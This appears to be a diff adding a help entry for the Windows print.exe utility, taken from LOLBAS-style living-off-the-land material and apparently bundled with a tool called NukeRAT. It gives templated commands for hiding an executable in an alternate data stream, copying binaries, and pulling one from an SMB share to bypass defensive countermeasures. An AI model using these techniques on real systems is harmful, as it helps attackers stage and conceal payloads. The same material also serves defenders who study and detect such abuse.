@@ -1,0 +1,21 @@
+ABOUT
+    Windows utility to send files to the printer. LOLBAS covers hide
+    binary file in alternate data stream to potentially bypass
+    defensive counter measures, copy files, and related techniques.
+
+USAGE:
+    print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe}
+    print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe}
+    print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe}
+
+EXAMPLES:
+    print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe}
+    print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe}
+    print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe}
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe}
